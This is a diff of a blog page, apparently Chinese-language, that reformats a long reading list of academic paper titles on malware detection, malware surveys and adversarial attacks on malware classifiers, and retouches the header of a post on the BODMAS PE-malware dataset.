-<p>2015 Android Security: A Survey of Issues, Malware Penetration, and Defenses</p>
-</li>
-<li>
-<p>2014 Evolution and Detection of Polymorphic and Metamorphic Malwares: A Survey</p>
-</li>
-<li>
-<p>2015 Kernel Malware Core Implementation: A Survey</p>
-</li>
-<li>
-<p>2016 A Survey of Stealth Malware Attacks, Mitigation Measures, and Steps Toward Autonomous Open World Solutions</p>
-</li>
-<li>
-<p>2016 On the Security of Machine Learning in Malware C&amp;C Detection: A Survey</p>
-</li>
-<li>
-<p>2017 Malware Methodologies and Its Future: A Survey</p>
-</li>
-<li>
-<p>2017 A Survey on Malware Detection Using Data Mining Techniques</p>
-</li>
-<li>
-<p>2018 Malware Dynamic Analysis Evasion Techniques: A Survey</p>
-</li>
-<li>
-<p>2018 Android Malware Detection: A Survey</p>
-</li>
-<li>
-<p>2018 A Survey on Metamorphic Malware Detection based on Hidden Markov Model</p>
-</li>
-<li>
-<p>2018 Machine Learning Aided Static Malware Analysis: A Survey and Tutorial</p>
-</li>
-<li>
-<p>2018 A survey on dynamic mobile malware detection</p>
-</li>
-<li>
-<p>2018 A survey of malware behavior description and analysis</p>
-</li>
-<li>
-<p>2019 A Survey on Android Malware Detection Techniques Using Machine Learning Algorithms</p>
-</li>
-<li>
-<p>2019 Dynamic Malware Analysis in the Modern Era—A State of the Art Survey</p>
-</li>
-<li>
-<p>2019 Data-Driven Android Malware Intelligence: A Survey</p>
-</li>
-<li>
-<p>2019 A survey of zero-day malware attacks and itsdetection methodology</p>
-</li>
-<li>
-<p>2019 A Survey on malware analysis and mitigation techniques</p>
-</li>
-<li>
-<p><strong>2019 Survey of machine learning techniques for malware analysis</strong></p>
-</li>
-<li>
-<p>2020 Deep Learning and Open Set Malware Classification: A Survey</p>
-</li>
-<li>
-<p>2020 A Comprehensive Survey on Machine Learning Techniques for Android Malware Detection</p>
-</li>
-<li>
-<p>2015 A Survey on Mining Program-Graph Features for Malware Analysis</p>
-</li>
-<li>
-<p>2020 Stochastic Modeling of IoT Botnet Spread: A Short Survey on Mobile Malware Spread Modeling</p>
-</li>
-<li>
-<p>2020 A survey of IoT malware and detection methods based on static features</p>
-</li>
-<li>
-<p>2020 A survey on practical adversarial examples for malware classifiers</p>
-</li>
-<li>
-<p>2020 A Survey of Machine Learning Methods and Challenges for Windows Malware Classification</p>
-</li>
-<li>
-<p>2020 A Survey on Malware Detection with Deep Learning</p>
-</li>
-<li>
-<p>2020 An emerging threat Fileless malware: a survey and research challenges</p>
-</li>
-<li>
-<p>2021 Malware classification and composition analysis: A survey of recent developments</p>
-</li>
-<li>
-<p><strong>2021 Adversarial EXEmples: A Survey and Experimental Evaluation of Practical Attacks on Machine Learning for Windows Malware Detection</strong></p>
-</li>
-<li>
-<p>2020 A Survey on Mobile Malware Detection Techniques</p>
-</li>
-<li>
-<p>2021 Towards interpreting ML-based automated malware detection models: a survey</p>
-</li>
-<li>
-<p>2021 A Survey of Android Malware Detection with Deep Neural Models</p>
-</li>
-<li>
-<p>2021 A survey of malware detection in Android apps: Recommendations and perspectives for future research</p>
-</li>
-<li>
-<p>2021 A survey of android application and malware hardening</p>
-</li>
-<li>
-<p>2021 A survey on machine learning-based malware detection in executable files</p>
-</li>
-<li>
-<p>2021 The evolution of IoT Malwares, from 2008 to 2019: Survey, taxonomy, process simulator and perspectives</p>
-</li>
-<li>
-<p>2021 A Survey of Android Malware Static Detection Technology Based on Machine Learning</p>
-</li>
-<li>
-<p>2016 Empirical assessment of machine learning-based malware detectors for Android Measuring the gap between in-the-lab and in-the-wild validation scenarios</p>
-</li>
-<li>
-<p>2016 When a Tree Falls: Using Diversity in Ensemble Classifiers to Identify Evasion in Malware Detectors</p>
-</li>
-<li>
-<p><strong>2016 Automatically Evading Classifiers A Case Study on PDF Malware Classifiers</strong></p>
-</li>
-<li>
-<p>2017 SecureDroid: Enhancing Security of Machine Learning-based Detection against Adversarial Android Malware Attacks</p>
-</li>
-<li>
-<p>2017 How to defend against adversarial attack</p>
-</li>
-<li>
-<p><strong>2017 Transcend: Detecting Concept Drift in Malware Classification Models</strong></p>
-</li>
-<li>
-<p><strong>2018 Automated poisoning attacks and defenses in malware detection systems: An adversarial machine learning approach</strong></p>
-</li>
-<li>
-<p><strong>2018 Generic Black-Box End-to-End Attack Against State of the Art API Call Based Malware Classifiers</strong></p>
-</li>
-<li>
-<p><strong>2019 Yes, Machine Learning Can Be More Secure! A Case Study on Android Malware Detection</strong></p>
-</li>
-<li>
-<p>2019 A cost analysis of machine learning using dynamic runtime opcodes for malware detection</p>
-</li>
-<li>
-<p><strong>2019 TESSERACT: Eliminating Experimental Bias in Malware Classification across Space and Time</strong></p>
-</li>
-<li>
-<p>2020 When Malware is Packin’ Heat; Limits of Machine Learning Classifiers Based on Static Analysis Features</p>
-</li>
-<li>
-<p>2020 Assessing and Improving Malware Detection Sustainability through App Evolution Studies</p>
-</li>
-<li>
-<p>2020 On Training Robust PDF Malware Classifiers</p>
-</li>
-<li>
-<p>2020 Adversarial Deep Ensemble: Evasion Attacks and Defenses for Malware Detection</p>
-</li>
-<li>
-<p>2020 Intriguing Properties of Adversarial ML Attacks in the Problem Space Fabio</p>
-</li>
-<li>
-<p>2020 Query-Efficient Black-Box Attack Against Sequence-Based Malware Classifiers</p>
-</li>
-<li>
-<p>2020 Enhancing State-of-the-art Classifiers with API Semantics to Detect Evolved Android Malware</p>
-</li>
-<li>
-<p>2021 Lessons Learnt on Reproducibility in Machine Learning Based Android Malware Detection</p>
-</li>
-<li>
-<p>2016 Semantics-Based Online Malware Detection: Towards Efficient Real-Time Protection Against Malware</p>
-</li>
-<li>
-<p>2018 Understanding Linux Malware</p>
-</li>
-<li>
-<p>2017 Droid-AntiRM: Taming Control Flow Anti-analysis to Support Automated Dynamic Analysis of Android Malware</p>
-</li>
-<li>
-<p>2017 Malton: Towards On-Device Non-Invasive Mobile Malware Analysis for ART</p>
-</li>
-<li>
-<p>2015 CopperDroid: Automatic Reconstruction of Android Malware Behaviors</p>
-</li>
-<li>
-<p>2018 EnMobile: Entity-based Characterization and Analysis of Mobile</p>
-</li>
-<li>
-<p>2015 Screening smartphone applications using malware family signatures</p>
-</li>
-<li>
-<p>2018 Toward a more dependable hybrid analysis of android malware using aspect-oriented programming</p>
-</li>
-<li>
-<p>2017 DroidNative: Automating and optimizing detection of Android native code malware variants</p>
-</li>
-<li>
-<p>2016 An HMM and structural entropy based detector for Android malware: An empirical study</p>
-</li>
-<li>
-<p>2020 Scalable and robust unsupervised android malware fingerprinting using community-based network partitioning</p>
-</li>
-<li>
-<p>2020 On the use of artificial malicious patterns for android malware detection</p>
-</li>
-<li>
-<p>2016 Andro-Dumpsys: Anti-malware system based on the similarity of malware creator and malware centric information</p>
-</li>
-<li>
-<p>2020 Bayesian Active Malware Analysis</p>
-</li>
-<li>
-<p>2020 PermPair: Android Malware Detection Using Permission Pairs</p>
-</li>
-<li>
-<p>2014 Apposcopy: Semantics-Based Detection of Android Malware through Static Analysis</p>
-</li>
-<li>
-<p>2015 Profiling user-trigger dependence for Android malware detection</p>
-</li>
-<li>
-<p>2019 Identifying Android Malware Using Network-Based Approaches</p>
-</li>
-<li>
-<p>2016 Cypider: Building Community-Based Cyber-Defense Infrastructure for Android Malware Detection</p>
-</li>
-<li>
-<p>2014 Semantics-Aware Android Malware Classification Using Weighted Contextual API Dependency Graphs</p>
-</li>
-<li>
-<p>2017 MAMADROID: Detecting Android Malware by Building Markov Chains of Behavioral Models</p>
-</li>
-<li>
-<p>2014 Drebin: Effective and Explainable Detection of Android Malware in Your Pocket</p>
-</li>
-<li>
-<p>2018 Make Evasion Harder: An Intelligent Android Malware Detection System</p>
-</li>
-<li>
-<p>2018 Using Loops For Malware Classification Resilient to Feature-unaware Perturbations</p>
-</li>
-<li>
-<p>2016 Semantic Modelling of Android Malware for Effective Malware Comprehension, Detection, and Classification</p>
-</li>
-<li>
-<p>2018 Detecting Android Malware Leveraging Text Semantics of Network Flows</p>
-</li>
-<li>
-<p>2018 Improving Accuracy of Android Malware Detection with Lightweight Contextual Awareness</p>
-</li>
-<li>
-<p>2019 MalScan: Fast Market-Wide Mobile Malware Scanning by Social-Network Centrality Analysis</p>
-</li>
-<li>
-<p>2017	PIndroid: A novel Android malware detection system using ensemble learning methods</p>
-</li>
-<li>
-<p>2017	A pragmatic android malware detection procedure</p>
-</li>
-<li>
-<p>2016	ICCDetector: ICC-Based Malware Detection on Android</p>
-</li>
-<li>
-<p>2015	A Probabilistic Discriminative Model for Android Malware Detection with Decompiled Source Code</p>
-</li>
-<li>
-<p>2019	DroidCat: Effective Android Malware Detection and Categorization via App-Level Profiling</p>
-</li>
-<li>
-<p>2018	MADAM: Effective and Efficient Behavior-based Android Malware Detection and Prevention</p>
-</li>
-<li>
-<p>2020	Android Malware Detection via (Somewhat) Robust Irreversible Feature Transformations</p>
-</li>
-<li>
-<p>2018	Leveraging ontologies and machine-learning techniques for malware analysis into Android permissions ecosystems</p>
-</li>
-<li>
-<p>2018	Lightweight, Obfuscation-Resilient Detection and Family Identification of Android Malware</p>
-</li>
-<li>
-<p>2018	A multi-view context-aware approach to Android malware detection and malicious code localization</p>
-</li>
-<li>
-<p>2019	DroidFusion: A Novel Multilevel Classifier Fusion Approach for Android Malware Detection</p>
-</li>
-<li>
-<p>2020	DL-Droid: Deep learning based android malware detection using real devices</p>
-</li>
-<li>
-<p>2021	JOWMDroid: Android malware detection based on feature weighting with joint optimization of weight-mapping and classifier parameters</p>
-</li>
-<li>
-<p>2020	Towards using unstructured user input request for malware detection</p>
-</li>
-<li>
-<p>2021 Toward s an interpretable deep learning model for mobile malware detection and family identification</p>
-</li>
-<li>
-<p>2020 AMalNet: A deep learning framework based on graph convolutional networks for malware detection</p>
-</li>
-<li>
-<p>2021 Disentangled Representation Learning in Heterogeneous Information Network for Large-scale Android Malware Detection in the COVID-19 Era and Beyond</p>
-</li>
-<li>
-<p>2019 A Multimodal Deep Learning Method for Android Malware Detection Using Various Features</p>
-</li>
-<li>
-<p>2019 Android Fragmentation in Malware Detection</p>
-</li>
-<li>
-<p>2019 An Image-inspired and CNN-based Android Malware Detection Approach</p>
-</li>
-<li>
-<p>2021 A Performance-Sensitive Malware Detection System Using Deep Learning on Mobile Devices</p>
-</li>
-<li>
-<p>2020 Byte-level malware classification based on markov images and deep learning</p>
-</li>
-<li>
-<p>2013 API Chaser: Anti-analysis Resistant Malware Analyzer</p>
-</li>
-<li>
-<p>2018 MalViz: An Interactive Visualization Tool for Tracing Malware</p>
-</li>
-<li>
-<p>2017 CloudEyes: Cloud-based malware detection with reversible sketch for resource-constrained internet of things (IoT) devices</p>
-</li>
-<li>
-<p>2013 A fast malware detection algorithm based on objective-oriented association mining</p>
-</li>
-<li>
-<p>2013 PoMMaDe: Pushdown Model-checking for Malware Detection</p>
-</li>
-<li>
-<p>2014 Growing Grapes in Your Computer to Defend Against Malware</p>
-</li>
-<li>
-<p>2015 Hypervisor-based malware protection with AccessMiner</p>
-</li>
-<li>
-<p>2015 Probabilistic Inference on Integrity for Access Behavior Based Malware Detection</p>
-</li>
-<li>
-<p>2018 Probabilistic analysis of dynamic malware traces</p>
-</li>
-<li>
-<p>2018 A malware detection method based on family behavior graph</p>
-</li>
-<li>
-<p>2018 Malware classification using self organising feature maps and machine activity data</p>
-</li>
-<li>
-<p>2019 Volatile memory analysis using the MinHash method for efficient and secured detection of malware in private cloud</p>
-</li>
-<li>
-<p>2020 A dynamic Windows malware detection and prediction method based on contextual understanding of API call sequence</p>
-</li>
-<li>
-<p>2013 Deriving common malware behavior through graph clustering</p>
-</li>
-<li>
-<p>2014 Enhancing the detection of metamorphic malware using call graphs</p>
-</li>
-<li>
-<p>2016 Minimal contrast frequent pattern mining for malware detection</p>
-</li>
-<li>
-<p>2019 Heterogeneous Graph Matching Networks for Unknown Malware Detection</p>
-</li>
-<li>
-<p>2021 Random CapsNet for est model for imbalanced malware type classification task</p>
-</li>
-<li>
-<p>2013 A Scalable Approach for Malware Detection through Bounded Feature Space Behavior Modeling</p>
-</li>
-<li>
-<p>2013 SigMal: A Static Signal Processing Based Malware Triage</p>
-</li>
-<li>
-<p>2014 Unsupervised Anomaly-Based Malware Detection Using Hardware Features</p>
-</li>
-<li>
-<p>2014 Control flow-based opcode behavior analysis for Malware detection</p>
-</li>
-<li>
-<p>2015 Employing Program Semantics for Malware Detection</p>
-</li>
-<li>
-<p>2015 AMAL: High-fidelity, behavior-based automated malware analysis and classification</p>
-</li>
-<li>
-<p>2016 Optimized Invariant Representation of Network Traffic for Detecting Unseen Malware Variants</p>
-</li>
-<li>
-<p>2017 DYNAMINER: Leveraging Offline Infection Analytics for On-the-Wire Malware Detection</p>
-</li>
-<li>
-<p>2017 Security importance assessment for system objects and malware detection</p>
-</li>
-<li>
-<p>2018 From big data to knowledge: A spatiotemporal approach to malware detection</p>
-</li>
-<li>
-<p>2019 MalDAE: Detecting and explaining malware based on correlation and fusion of static and dynamic characteristics</p>
-</li>
-<li>
-<p>2019	Leveraging Compression-Based Graph Mining for Behavior-Based Malware Detection</p>
-</li>
-<li>
-<p>2020	Advanced Windows Methods on Malware Detection and Classification</p>
-</li>
-<li>
-<p>2020	Sub-curve HMM: A malware detection approach based on partial analysis of API call sequences</p>
-</li>
-<li>
-<p>2020 Multiclass malware classification via first- and second-order texture statistics</p>
-</li>
-<li>
-<p>2021 Catch them alive: A malware detection approach through memory forensics, manifold learning and computer vision</p>
-</li>
-<li>
-<p>2018 Auto-detection of sophisticated malware using lazy-binding control flow graph and deep learning</p>
-</li>
-<li>
-<p>2018 Malware identification using visualization images and deep learning</p>
-</li>
-<li>
-<p>2018 Classification of Malware by Using Structural Entropy on Convolutional Neural Networks</p>
-</li>
-<li>
-<p>2019 Classifying Malware Represented as Control Flow Graphs using Deep Graph Convolutional Neural Network</p>
-</li>
-<li>
-<p>2019 Neurlux: Dynamic Malware Analysis Without Feature Engineering</p>
-</li>
-<li>
-<p>2019 A feature-hybrid malware variants detection using CNN based opcode embedding and BPNN based API embedding</p>
-</li>
-<li>
-<p>2019 Effective analysis of malware detection in cloud computing</p>
-</li>
-<li>
-<p>2020 Recurrent neural network for detecting malware</p>
-</li>
-<li>
-<p>2020 Dynamic Malware Analysis with Feature Engineering and Feature Learning</p>
-</li>
-<li>
-<p>2020 An improved two-hidden-layer extreme learning machine for malware hunting</p>
-</li>
-<li>
-<p>2020 HYDRA: A multimodal deep learning framework for malware classification</p>
-</li>
-<li>
-<p>2020 A novel method for malware detection on ML-based visualization technique</p>
-</li>
-<li>
-<p>2020 Image-Based malware classification using ensemble of CNN architectures (IMCEC)</p>
-</li>
+<ol type="1">
+<li><p>2014 A Survey of Android Malware Characterisitics and Mitigation
+Techniques</p></li>
+<li><p>2014 Smartphone Malware and Its Propagation Modeling:A
+Survey</p></li>
+<li><p>2015 Android Security: A Survey of Issues, Malware Penetration,
+and Defenses</p></li>
+<li><p>2014 Evolution and Detection of Polymorphic and Metamorphic
+Malwares: A Survey</p></li>
+<li><p>2015 Kernel Malware Core Implementation: A Survey</p></li>
+<li><p>2016 A Survey of Stealth Malware Attacks, Mitigation Measures,
+and Steps Toward Autonomous Open World Solutions</p></li>
+<li><p>2016 On the Security of Machine Learning in Malware C&amp;C
+Detection: A Survey</p></li>
+<li><p>2017 Malware Methodologies and Its Future: A Survey</p></li>
+<li><p>2017 A Survey on Malware Detection Using Data Mining
+Techniques</p></li>
+<li><p>2018 Malware Dynamic Analysis Evasion Techniques: A
+Survey</p></li>
+<li><p>2018 Android Malware Detection: A Survey</p></li>
+<li><p>2018 A Survey on Metamorphic Malware Detection based on Hidden
+Markov Model</p></li>
+<li><p>2018 Machine Learning Aided Static Malware Analysis: A Survey and
+Tutorial</p></li>
+<li><p>2018 A survey on dynamic mobile malware detection</p></li>
+<li><p>2018 A survey of malware behavior description and
+analysis</p></li>
+<li><p>2019 A Survey on Android Malware Detection Techniques Using
+Machine Learning Algorithms</p></li>
+<li><p>2019 Dynamic Malware Analysis in the Modern Era—A State of the
+Art Survey</p></li>
+<li><p>2019 Data-Driven Android Malware Intelligence: A Survey</p></li>
+<li><p>2019 A survey of zero-day malware attacks and itsdetection
+methodology</p></li>
+<li><p>2019 A Survey on malware analysis and mitigation
+techniques</p></li>
+<li><p><strong>2019 Survey of machine learning techniques for malware
+analysis</strong></p></li>
+<li><p>2020 Deep Learning and Open Set Malware Classification: A
+Survey</p></li>
+<li><p>2020 A Comprehensive Survey on Machine Learning Techniques for
+Android Malware Detection</p></li>
+<li><p>2015 A Survey on Mining Program-Graph Features for Malware
+Analysis</p></li>
+<li><p>2020 Stochastic Modeling of IoT Botnet Spread: A Short Survey on
+Mobile Malware Spread Modeling</p></li>
+<li><p>2020 A survey of IoT malware and detection methods based on
+static features</p></li>
+<li><p>2020 A survey on practical adversarial examples for malware
+classifiers</p></li>
+<li><p>2020 A Survey of Machine Learning Methods and Challenges for
+Windows Malware Classification</p></li>
+<li><p>2020 A Survey on Malware Detection with Deep Learning</p></li>
+<li><p>2020 An emerging threat Fileless malware: a survey and research
+challenges</p></li>
+<li><p>2021 Malware classification and composition analysis: A survey of
+recent developments</p></li>
+<li><p><strong>2021 Adversarial EXEmples: A Survey and Experimental
+Evaluation of Practical Attacks on Machine Learning for Windows Malware
+Detection</strong></p></li>
+<li><p>2020 A Survey on Mobile Malware Detection Techniques</p></li>
+<li><p>2021 Towards interpreting ML-based automated malware detection
+models: a survey</p></li>
+<li><p>2021 A Survey of Android Malware Detection with Deep Neural
+Models</p></li>
+<li><p>2021 A survey of malware detection in Android apps:
+Recommendations and perspectives for future research</p></li>
+<li><p>2021 A survey of android application and malware
+hardening</p></li>
+<li><p>2021 A survey on machine learning-based malware detection in
+executable files</p></li>
+<li><p>2021 The evolution of IoT Malwares, from 2008 to 2019: Survey,
+taxonomy, process simulator and perspectives</p></li>
+<li><p>2021 A Survey of Android Malware Static Detection Technology
+Based on Machine Learning</p></li>
+<li><p>2016 Empirical assessment of machine learning-based malware
+detectors for Android Measuring the gap between in-the-lab and
+in-the-wild validation scenarios</p></li>
+<li><p>2016 When a Tree Falls: Using Diversity in Ensemble Classifiers
+to Identify Evasion in Malware Detectors</p></li>
+<li><p><strong>2016 Automatically Evading Classifiers A Case Study on
+PDF Malware Classifiers</strong></p></li>
+<li><p>2017 SecureDroid: Enhancing Security of Machine Learning-based
+Detection against Adversarial Android Malware Attacks</p></li>
+<li><p>2017 How to defend against adversarial attack</p></li>
+<li><p><strong>2017 Transcend: Detecting Concept Drift in Malware
+Classification Models</strong></p></li>
+<li><p><strong>2018 Automated poisoning attacks and defenses in malware
+detection systems: An adversarial machine learning
+approach</strong></p></li>
+<li><p><strong>2018 Generic Black-Box End-to-End Attack Against State of
+the Art API Call Based Malware Classifiers</strong></p></li>
+<li><p><strong>2019 Yes, Machine Learning Can Be More Secure! A Case
+Study on Android Malware Detection</strong></p></li>
+<li><p>2019 A cost analysis of machine learning using dynamic runtime
+opcodes for malware detection</p></li>
+<li><p><strong>2019 TESSERACT: Eliminating Experimental Bias in Malware
+Classification across Space and Time</strong></p></li>
+<li><p>2020 When Malware is Packin’ Heat; Limits of Machine Learning
+Classifiers Based on Static Analysis Features</p></li>
+<li><p>2020 Assessing and Improving Malware Detection Sustainability
+through App Evolution Studies</p></li>
+<li><p>2020 On Training Robust PDF Malware Classifiers</p></li>
+<li><p>2020 Adversarial Deep Ensemble: Evasion Attacks and Defenses for
+Malware Detection</p></li>
+<li><p>2020 Intriguing Properties of Adversarial ML Attacks in the
+Problem Space Fabio</p></li>
+<li><p>2020 Query-Efficient Black-Box Attack Against Sequence-Based
+Malware Classifiers</p></li>
+<li><p>2020 Enhancing State-of-the-art Classifiers with API Semantics to
+Detect Evolved Android Malware</p></li>
+<li><p>2021 Lessons Learnt on Reproducibility in Machine Learning Based
+Android Malware Detection</p></li>
+<li><p>2016 Semantics-Based Online Malware Detection: Towards Efficient
+Real-Time Protection Against Malware</p></li>
+<li><p>2018 Understanding Linux Malware</p></li>
+<li><p>2017 Droid-AntiRM: Taming Control Flow Anti-analysis to Support
+Automated Dynamic Analysis of Android Malware</p></li>
+<li><p>2017 Malton: Towards On-Device Non-Invasive Mobile Malware
+Analysis for ART</p></li>
+<li><p>2015 CopperDroid: Automatic Reconstruction of Android Malware
+Behaviors</p></li>
+<li><p>2018 EnMobile: Entity-based Characterization and Analysis of
+Mobile</p></li>
+<li><p>2015 Screening smartphone applications using malware family
+signatures</p></li>
+<li><p>2018 Toward a more dependable hybrid analysis of android malware
+using aspect-oriented programming</p></li>
+<li><p>2017 DroidNative: Automating and optimizing detection of Android
+native code malware variants</p></li>
+<li><p>2016 An HMM and structural entropy based detector for Android
+malware: An empirical study</p></li>
+<li><p>2020 Scalable and robust unsupervised android malware
+fingerprinting using community-based network partitioning</p></li>
+<li><p>2020 On the use of artificial malicious patterns for android
+malware detection</p></li>
+<li><p>2016 Andro-Dumpsys: Anti-malware system based on the similarity
+of malware creator and malware centric information</p></li>
+<li><p>2020 Bayesian Active Malware Analysis</p></li>
+<li><p>2020 PermPair: Android Malware Detection Using Permission
+Pairs</p></li>
+<li><p>2014 Apposcopy: Semantics-Based Detection of Android Malware
+through Static Analysis</p></li>
+<li><p>2015 Profiling user-trigger dependence for Android malware
+detection</p></li>
+<li><p>2019 Identifying Android Malware Using Network-Based
+Approaches</p></li>
+<li><p>2016 Cypider: Building Community-Based Cyber-Defense
+Infrastructure for Android Malware Detection</p></li>
+<li><p>2014 Semantics-Aware Android Malware Classification Using
+Weighted Contextual API Dependency Graphs</p></li>
+<li><p>2017 MAMADROID: Detecting Android Malware by Building Markov
+Chains of Behavioral Models</p></li>
+<li><p>2014 Drebin: Effective and Explainable Detection of Android
+Malware in Your Pocket</p></li>
+<li><p>2018 Make Evasion Harder: An Intelligent Android Malware
+Detection System</p></li>
+<li><p>2018 Using Loops For Malware Classification Resilient to
+Feature-unaware Perturbations</p></li>
+<li><p>2016 Semantic Modelling of Android Malware for Effective Malware
+Comprehension, Detection, and Classification</p></li>
+<li><p>2018 Detecting Android Malware Leveraging Text Semantics of
+Network Flows</p></li>
+<li><p>2018 Improving Accuracy of Android Malware Detection with
+Lightweight Contextual Awareness</p></li>
+<li><p>2019 MalScan: Fast Market-Wide Mobile Malware Scanning by
+Social-Network Centrality Analysis</p></li>
+<li><p>2017 PIndroid: A novel Android malware detection system using
+ensemble learning methods</p></li>
+<li><p>2017 A pragmatic android malware detection procedure</p></li>
+<li><p>2016 ICCDetector: ICC-Based Malware Detection on Android</p></li>
+<li><p>2015 A Probabilistic Discriminative Model for Android Malware
+Detection with Decompiled Source Code</p></li>
+<li><p>2019 DroidCat: Effective Android Malware Detection and
+Categorization via App-Level Profiling</p></li>
+<li><p>2018 MADAM: Effective and Efficient Behavior-based Android
+Malware Detection and Prevention</p></li>
+<li><p>2020 Android Malware Detection via (Somewhat) Robust Irreversible
+Feature Transformations</p></li>
+<li><p>2018 Leveraging ontologies and machine-learning techniques for
+malware analysis into Android permissions ecosystems</p></li>
+<li><p>2018 Lightweight, Obfuscation-Resilient Detection and Family
+Identification of Android Malware</p></li>
+<li><p>2018 A multi-view context-aware approach to Android malware
+detection and malicious code localization</p></li>
+<li><p>2019 DroidFusion: A Novel Multilevel Classifier Fusion Approach
+for Android Malware Detection</p></li>
+<li><p>2020 DL-Droid: Deep learning based android malware detection
+using real devices</p></li>
+<li><p>2021 JOWMDroid: Android malware detection based on feature
+weighting with joint optimization of weight-mapping and classifier
+parameters</p></li>
+<li><p>2020 Towards using unstructured user input request for malware
+detection</p></li>
+<li><p>2021 Toward s an interpretable deep learning model for mobile
+malware detection and family identification</p></li>
+<li><p>2020 AMalNet: A deep learning framework based on graph
+convolutional networks for malware detection</p></li>
+<li><p>2021 Disentangled Representation Learning in Heterogeneous
+Information Network for Large-scale Android Malware Detection in the
+COVID-19 Era and Beyond</p></li>
+<li><p>2019 A Multimodal Deep Learning Method for Android Malware
+Detection Using Various Features</p></li>
+<li><p>2019 Android Fragmentation in Malware Detection</p></li>
+<li><p>2019 An Image-inspired and CNN-based Android Malware Detection
+Approach</p></li>
+<li><p>2021 A Performance-Sensitive Malware Detection System Using Deep
+Learning on Mobile Devices</p></li>
+<li><p>2020 Byte-level malware classification based on markov images and
+deep learning</p></li>
+<li><p>2013 API Chaser: Anti-analysis Resistant Malware
+Analyzer</p></li>
+<li><p>2018 MalViz: An Interactive Visualization Tool for Tracing
+Malware</p></li>
+<li><p>2017 CloudEyes: Cloud-based malware detection with reversible
+sketch for resource-constrained internet of things (IoT)
+devices</p></li>
+<li><p>2013 A fast malware detection algorithm based on
+objective-oriented association mining</p></li>
+<li><p>2013 PoMMaDe: Pushdown Model-checking for Malware
+Detection</p></li>
+<li><p>2014 Growing Grapes in Your Computer to Defend Against
+Malware</p></li>
+<li><p>2015 Hypervisor-based malware protection with
+AccessMiner</p></li>
+<li><p>2015 Probabilistic Inference on Integrity for Access Behavior
+Based Malware Detection</p></li>
+<li><p>2018 Probabilistic analysis of dynamic malware traces</p></li>
+<li><p>2018 A malware detection method based on family behavior
+graph</p></li>
+<li><p>2018 Malware classification using self organising feature maps
+and machine activity data</p></li>
+<li><p>2019 Volatile memory analysis using the MinHash method for
+efficient and secured detection of malware in private cloud</p></li>
+<li><p>2020 A dynamic Windows malware detection and prediction method
+based on contextual understanding of API call sequence</p></li>
+<li><p>2013 Deriving common malware behavior through graph
+clustering</p></li>
+<li><p>2014 Enhancing the detection of metamorphic malware using call
+graphs</p></li>
+<li><p>2016 Minimal contrast frequent pattern mining for malware
+detection</p></li>
+<li><p>2019 Heterogeneous Graph Matching Networks for Unknown Malware
+Detection</p></li>
+<li><p>2021 Random CapsNet for est model for imbalanced malware type
+classification task</p></li>
+<li><p>2013 A Scalable Approach for Malware Detection through Bounded
+Feature Space Behavior Modeling</p></li>
+<li><p>2013 SigMal: A Static Signal Processing Based Malware
+Triage</p></li>
+<li><p>2014 Unsupervised Anomaly-Based Malware Detection Using Hardware
+Features</p></li>
+<li><p>2014 Control flow-based opcode behavior analysis for Malware
+detection</p></li>
+<li><p>2015 Employing Program Semantics for Malware Detection</p></li>
+<li><p>2015 AMAL: High-fidelity, behavior-based automated malware
+analysis and classification</p></li>
+<li><p>2016 Optimized Invariant Representation of Network Traffic for
+Detecting Unseen Malware Variants</p></li>
+<li><p>2017 DYNAMINER: Leveraging Offline Infection Analytics for
+On-the-Wire Malware Detection</p></li>
+<li><p>2017 Security importance assessment for system objects and
+malware detection</p></li>
+<li><p>2018 From big data to knowledge: A spatiotemporal approach to
+malware detection</p></li>
+<li><p>2019 MalDAE: Detecting and explaining malware based on
+correlation and fusion of static and dynamic characteristics</p></li>
+<li><p>2019 Leveraging Compression-Based Graph Mining for Behavior-Based
+Malware Detection</p></li>
+<li><p>2020 Advanced Windows Methods on Malware Detection and
+Classification</p></li>
+<li><p>2020 Sub-curve HMM: A malware detection approach based on partial
+analysis of API call sequences</p></li>
+<li><p>2020 Multiclass malware classification via first- and
+second-order texture statistics</p></li>
+<li><p>2021 Catch them alive: A malware detection approach through
+memory forensics, manifold learning and computer vision</p></li>
+<li><p>2018 Auto-detection of sophisticated malware using lazy-binding
+control flow graph and deep learning</p></li>
+<li><p>2018 Malware identification using visualization images and deep
+learning</p></li>
+<li><p>2018 Classification of Malware by Using Structural Entropy on
+Convolutional Neural Networks</p></li>
+<li><p>2019 Classifying Malware Represented as Control Flow Graphs using
+Deep Graph Convolutional Neural Network</p></li>
+<li><p>2019 Neurlux: Dynamic Malware Analysis Without Feature
+Engineering</p></li>
+<li><p>2019 A feature-hybrid malware variants detection using CNN based
+opcode embedding and BPNN based API embedding</p></li>
+<li><p>2019 Effective analysis of malware detection in cloud
+computing</p></li>
+<li><p>2020 Recurrent neural network for detecting malware</p></li>
+<li><p>2020 Dynamic Malware Analysis with Feature Engineering and
+Feature Learning</p></li>
+<li><p>2020 An improved two-hidden-layer extreme learning machine for
+malware hunting</p></li>
+<li><p>2020 HYDRA: A multimodal deep learning framework for malware
+classification</p></li>
+<li><p>2020 A novel method for malware detection on ML-based
+visualization technique</p></li>
+<li><p>2020 Image-Based malware classification using ensemble of CNN
+architectures (IMCEC)</p></li>
 </ol>
 
       
@@ -3165,7 +3433,7 @@ github地址：<br>
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>3 分钟</span>
+      <span>2 分钟</span>
     </span>
 </div>
 
@@ -3176,22 +3444,32 @@ github地址：<br>
     
     
     <div class="post-body" itemprop="articleBody">
-          <h3><span id="bodmas-an-open-dataset-for-learning-based-temporal-analysis-of-pe-malware">BODMAS: An Open Dataset for Learning based Temporal Analysis of PE Malware</span></h3>
+          <h3><span id="bodmasan-open-dataset-for-learning-based-temporal-analysis-of-pe-malware">BODMAS:
+An Open Dataset for Learning based Temporal Analysis of PE Malware</span></h3>
 <blockquote>
-<p>2021 <a target="_blank" rel="noopener" href="https://dblp.uni-trier.de/db/conf/sp/sp2021w.html#YangCLA021">SP Workshops</a></p>
+<p>2021 <a target="_blank" rel="noopener" href="https://dblp.uni-trier.de/db/conf/sp/sp2021w.html#YangCLA021">SP
+Workshops</a></p>
 <p>On training robust PDF malware classifiers. (2020 USENIX)</p>
 </blockquote>
 <h3><span id="一-摘要">一、摘要</span></h3>
